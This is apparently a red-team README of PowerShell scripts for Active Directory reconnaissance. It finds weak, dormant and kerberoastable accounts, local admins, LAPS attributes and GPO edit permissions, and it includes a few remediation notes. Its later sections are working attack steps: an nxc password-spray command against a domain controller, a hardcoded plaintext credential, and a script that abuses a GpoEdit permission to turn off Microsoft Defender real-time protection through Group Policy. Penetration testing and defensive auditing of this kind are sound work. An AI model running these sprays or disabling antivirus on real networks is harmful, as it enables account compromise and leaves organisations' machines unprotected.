# Active Directory PowerShell Scripts  

>PowerShell Scripts to aid in Active directory enumeration and identifying high value objects or permissions:  
  
1. Potential weak accounts target by malicious actors with weak passwords
2. Notable AD User Accounts that have not change their passwords and did not logon since given date. - Dormant  
3. AD Groups
4. Accounts with SPN values kerberoastable from Active Directory.  
5. High value AD Computers  
6. User Behavious Activity
7. Current user permissions for all objects ACL  
8. Password Spray single password against list of usernames.  
9. LAPS Discovery
10. Workstation Resourcs
11. Abuse Group Policy Edit Permission on GPO.  

----  

>[YouTube Video: Hackers Evade Detection with PowerShell Obfuscation](https://youtu.be/t4rpsFt6n08?si=5T3hOLQl3RghwfsB)  
>[https://powershellforhackers.com/](https://powershellforhackers.com/)  

----  

## Potential Weak Targets  

>PowerShell active directory script to Identify accounts targeted by malicious actors that gain internal network access:
* Enabled accounts  
* Account created over 2 years ago  
* password last set older than 1 year  
* password never expires flag enabled  

>Remediation:  
* change to use strong complex passwords
* AD user Account with no recent logon history for last 6 months must be disabled
* Cleanup by removing all group membership and permissions  

```
Potential-weak-target-accounts.ps1
```  

----  

## Notable Dormant AD Users  

>PowerShell Script: `GET_ADUsers-Password_last_set_sinceDate1.ps1`  

>Provide number of days to calculate a date since password for user accounts in Active Directory was last changed and when last account logged on.

>Obtain the search base Distinguished name field "distinguishedName", value from active directory, using attribute editor in Active Directory Users and Computers MMC.

![AD Attribute Editor distinguishedName](/images/distinguishedName.png)

>Output from the PowerShell Script with random user account last logon date and last password set date to verify.  

![AD Account from data variable verify](/images/image003.png)

>This can be used during redteam or penetration test security assessment.  

----  

## Status of AD Group Members  

>Get the status of group members in group for their last logon, enabled, description, password last set dates:

```PowerShell
# Define the Active Directory group name
$GroupName = "Group Finance Users SG"

# Define the output CSV file path
$OutputCSV = "D:\Temp\FinanceSG_Members.csv"

# Import the Active Directory module (ensure RSAT is installed)
Import-Module ActiveDirectory

# Get members of the AD group
$Members = Get-ADGroupMember -Identity $GroupName -Recursive | Where-Object { $_.objectClass -eq "user" }

# Retrieve user properties
$UserDetails = $Members | ForEach-Object {
    $User = Get-ADUser -Identity $_.SamAccountName -Properties SamAccountName, Description, Enabled, LastLogonDate, PasswordLastSet, PasswordNeverExpires, LastLogon, LastLogonTimestamp
    
    # Convert LastLogon and LastLogonTimestamp to readable date format
    $LastLogonReadable = if ($User.LastLogon -gt 0) { [datetime]::FromFileTime($User.LastLogon) } else { $null }
    $LastLogonTimestampReadable = if ($User.LastLogonTimestamp -gt 0) { [datetime]::FromFileTime($User.LastLogonTimestamp) } else { $null }

    # Construct output object
    [PSCustomObject]@{
        SamAccountName      = $User.SamAccountName
        Description         = $User.Description
        Enabled             = $User.Enabled
        LastLogonDate       = $User.LastLogonDate
        PasswordLastSet     = $User.PasswordLastSet
        PasswordNeverExpires= $User.PasswordNeverExpires
        LastLogon           = $LastLogonReadable
        LastLogonTimestamp  = $LastLogonTimestampReadable
    }
}

# Export to CSV
$UserDetails | Export-Csv -Path $OutputCSV -NoTypeInformation

Write-Output "Export completed: $OutputCSV"
```  

----  

## Kerberoasting  

>PowerShell Script: `get-kerberoastable-user-info.ps1`  

>Get AD user accounts with SPN set and as result vulnerable to Kerberoasting attacks offline password cracking.  

```powershell
get-kerberoastable-user-info.ps1
Get-Content C:\temp\KerberoastingVulnerableAccounts.csv
```  

----  

## High Value Computes  

>Get list of AD computers where name contain string of possible crown jewels high value targets:  

```PowerShell
Get-ADComputer -Filter * -Properties LastLogonDate | 
    Where-Object { $_.Name -like "*hr*" } | 
    Select-Object Name, LastLogonDate | 
    Export-Csv -Path "D:\Support\servers\pay-servers-list-2025.csv" -NoTypeInformation -Force

```  

>List the results from CSV output: `Get-Content D:\Support\servers\pay-servers-list-2025.csv`  

>Get the local administrator members for each server AD computer that is active and enabled with last login in past 8 days:  

>Script: `Get-AD-Computer-Servers-Local-Administrator-Members.ps1`  

```PowerShell
# Output file
$outputFile = "D:\temp\Local_Administrators_on_servers_Report.csv"
$cutoffDate = (Get-Date).AddDays(-8)
$serverList = @()

# Step 1: Get server OS computers from AD
$serverList = Get-ADComputer -Filter {
    Enabled -eq $true -and
    OperatingSystem -like "*Server*"
} -Properties Name, OperatingSystem, LastLogonDate | Where-Object {
    $_.LastLogonDate -ne $null -and $_.LastLogonDate -ge $cutoffDate
}

$serverList.count

# Step 2: Create output structure
$result = @()

# Step 3: Loop through servers and query local administrators
foreach ($server in $serverList) {
    $computerName = $server.Name
	
    Write-Host "Checking local admins on: $computerName"

    try {
        $admins = Invoke-Command -ComputerName $computerName -ScriptBlock {
            try {
                $group = [ADSI]"WinNT://$env:COMPUTERNAME/Administrators,group"
                $members = @()
                $group.Members() | ForEach-Object {
                    $members += $_.GetType().InvokeMember("Name", 'GetProperty', $null, $_, $null)
                }
                return $members
            } catch {
                return @("Error: $_")
            }
        } -ErrorAction Stop

        foreach ($admin in $admins) {
            $result += [PSCustomObject]@{
                ComputerName = $computerName
                Administrator = $admin
            }
        }
    } catch {
        $result += [PSCustomObject]@{
            ComputerName = $computerName
            Administrator = "Connection Failed: $_"
        }
    }
}

# Step 4: Export results to CSV
$result | Export-Csv -Path $outputFile -NoTypeInformation
Write-Host "Report saved to $outputFile"
```  

----  

## AD Account Activity  

>PowerShell Script: `AD-account-activity-status.ps1`  

>Providing an input file of user accounts to report on their, LastLogonTimestamp, if Account Enabled, When Password Last Set, If Password is set to Never Expires and value of Description field.  

----  

## Current user AD permissions on Objects  

>PowerShell Script: `Get-user-permissions-objects-ACL.ps1`  

>List the Active Directory objects that the currently logged-on user has write, modify, or full access permissions to edit.  

![acl-object-permissions.png](/images/acl-object-permissions.png)  

----  

## Password Policy & Spray  

>AD accounts with weak or old passwords are a security risk to an organization,  
>as their passwords may not comply to latest domain password policy and has been dormant.  
>Malicious actors finding these accounts can use it to gain read access to Active Directory.  

>Get the AD Password Policy:  

```PowerShell
# Specify the trusted domain name
$trustedDomain = "target.int"

# Get password policy details for the trusted domain
$passwordPolicy = Get-ADDefaultDomainPasswordPolicy -Server $trustedDomain

# Display the password policy details
$passwordPolicy | Select-Object *
```  

![password-policy.png](/images/password-policy.png)  

>Attack using a password spray attack using nxc.  

```bash
nxc -t 1 smb domaincontroller.domain.internal -u userlist.txt -p password --continue-on-success
```  

>Above is nxc command to spray the password of password using list of possible Active Directory user accounts.  

----  

## LAPS Enumeration  

>Local Administrator Password Service, Active Directory PowerShell script get values for all computers with LAPS settings:  

```PowerShell
Import-Module ActiveDirectory

Get-ADComputer -Filter * -Properties * |
ForEach-Object {
    $props = $_.PSObject.Properties |
        Where-Object { $_.Name -like '*laps*' }

    if ($props) {
        $expiration = $_.'msLAPS-PasswordExpirationTime'
        if ($expiration) {
            try {
                $readableTime = ([datetime]::FromFileTimeUtc($expiration)).ToString('yyyy-MM-dd HH:mm:ss')
            } catch {
                $readableTime = "InvalidTimeFormat"
            }
        } else {
            $readableTime = "NotSet"
        }

        [PSCustomObject]@{
            ComputerName          = $_.Name
            LAPS_Expiration       = $readableTime
            LAPS_Fields_Extracted = ($props | ForEach-Object { "$($_.Name)=$($_.Value)" }) -join "; "
        }
    }
} | Format-Table -Wrap -AutoSize
``` 

----  

## Workstation Resource Enumeration  

>Get the memory, cpu and missing security patches for Windows workstation:  

```powershell
# Ensure script execution is allowed for the current user
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
 
# Get system info
$serverName = $env:COMPUTERNAME
$dateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
 
# CPU usage (%)
$cpuUsage = (Get-Counter '\Processor(_Total)\% Processor Time').CounterSamples.CookedValue
$cpuUsage = [math]::Round($cpuUsage, 2)
 
# Memory usage (%)
$mem = Get-CimInstance Win32_OperatingSystem
$memUsage = [math]::Round((($mem.TotalVisibleMemorySize - $mem.FreePhysicalMemory) / $mem.TotalVisibleMemorySize) * 100, 2)
 
# Operating System Info - systeminfo
$osName = $mem.Caption
$osVersion = $mem.Version
 
# Last Installed security windows patch  
$lastPatch = Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 1
$lastPatchDate = $lastPatch.InstalledOn
 
# Missing security pathces and Updates outstanding and not Installed
try {
    $missingUpdates = (New-Object -ComObject Microsoft.Update.Session).CreateUpdateSearcher().Search("IsInstalled=0").Updates | 
                      Select-Object -ExpandProperty Title
} catch {
    $missingUpdates = @("Unable to retrieve missing updates. Windows Update service may be disabled.")
}
 
# Print to shell
Write-Host "Server Name            : $serverName"
Write-Host "Date & Time            : $dateTime"
Write-Host "CPU Usage              : $cpuUsage %"
Write-Host "Memory Usage           : $memUsage %"
Write-Host "Operating System       : $osName ($osVersion)"
Write-Host "Last Patch Installed On: $lastPatchDate"
 
# Print missing updates
Write-Host "Missing Updates        :"
if ($missingUpdates.Count -eq 0) {
    Write-Host "  None"
} else {
    foreach ($update in $missingUpdates) {
        Write-Host "  - $update"
    }
}
```  

----  

## GpoEdit Permission Abuse  

>Determine if you can edit Group Policy with user account that is known or compromised.  
>If that GPO controls Microsoft Defender real-time protection or is set higher level abuse it to disable antivirus protection.  

>If you have control of windows 11 workstation in domain install Group Policy Powershell module,  
>or add own computer to domain is compromised user can add new computers to the domain.  

```PowerShell
Add-WindowsCapability -Online -Name Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0

Get-Module -ListAvailable GroupPolicy

Import-Module GroupPolicy

Get-GPO -All | Select-Object DisplayName, Id, CreationTime, ModificationTime, Owner

Get-GPO -All | Out-GridView
```  

>Run the following script to identify and enumeration group policy delegated permission in Active directory:  

```PowerShell
Import-Module GroupPolicy

# Get all GPOs
$gpos = Get-GPO -All

foreach ($gpo in $gpos) {
    Write-Host "`n========== $($gpo.DisplayName) =========="

    # Get all permissions
    $permissions = Get-GPPermission -Guid $gpo.Id -All

    foreach ($perm in $permissions) {
        # Show only permissions relevant to editing or full control
        if ($perm.Permission -in @("GpoEdit", "GpoEditDeleteModifySecurity")) {
            $name = $perm.Trustee.Name
            $sid = $perm.Trustee.Sid.Value
            $type = $perm.Trustee.Type

            Write-Host "Trustee: $name ($type) - SID: $sid - Permission: $($perm.Permission)"
        }
    }
}
```  

>Run the above script: `.\list_all_users_edit_GPO_permission.ps1`  

>The output example below shows the user `auser` have `GpoEdit` permissions on the GPO: `Microsoft Defender AD GPO`  

```PowerShell
========== Default Domain Policy ==========
Trustee: SYSTEM () - SID: S-1-5-18 - Permission: GpoEditDeleteModifySecurity

========== Microsoft Defender AD GPO ==========
Trustee: auser () - SID: S-1-5-21-1153563262-525900357-1151977077-1121 - Permission: GpoEdit
Trustee: Domain Admins () - SID: S-1-5-21-1153563262-525900357-1151977077-512 - Permission: GpoEditDeleteModifySecurity
Trustee: Enterprise Admins () - SID: S-1-5-21-1153563262-525900357-1151977077-519 - Permission: GpoEditDeleteModifySecurity
Trustee: SYSTEM () - SID: S-1-5-18 - Permission: GpoEditDeleteModifySecurity

========== Default Domain Controllers Policy ==========
Trustee: SYSTEM () - SID: S-1-5-18 - Permission: GpoEditDeleteModifySecurity

========== SeImpersonatePrivilege - AUser ==========
Trustee: Domain Admins () - SID: S-1-5-21-1153563262-525900357-1151977077-512 - Permission: GpoEditDeleteModifySecurity
Trustee: Enterprise Admins () - SID: S-1-5-21-1153563262-525900357-1151977077-519 - Permission: GpoEditDeleteModifySecurity
Trustee: SYSTEM () - SID: S-1-5-18 - Permission: GpoEditDeleteModifySecurity
```  

>Remote connect as the user with the dangerous permissions:   

```PowerShell
# Prompt: alternatively, store securely rather than plaintext
$SecurePass = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential("LAB\auser", $SecurePass)
```  

Run the following scritp to set the GPO setting and disable Defender antivirus: `C:\tools\turn_off_real-time_protection_defender.ps1`  

```PowerShell
Import-Module GroupPolicy

Set-GPRegistryValue -Name "Microsoft Defender AD GPO" `
    -Key "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" `
    -ValueName "DisableRealtimeMonitoring" `
    -Type DWord `
    -Value 1

Write-Host "[+] Successfully set 'Turn off real-time protection' to Enabled."
```

Run the following scritp to set the GPO setting and disable Defender antivirus: `C:\tools\turn_off_real-time_protection_defender.ps1`  

![GPO_Dangerous_Permission_GpoEdit.png](/images/GPO_Dangerous_Permission_GpoEdit.png)  

----  

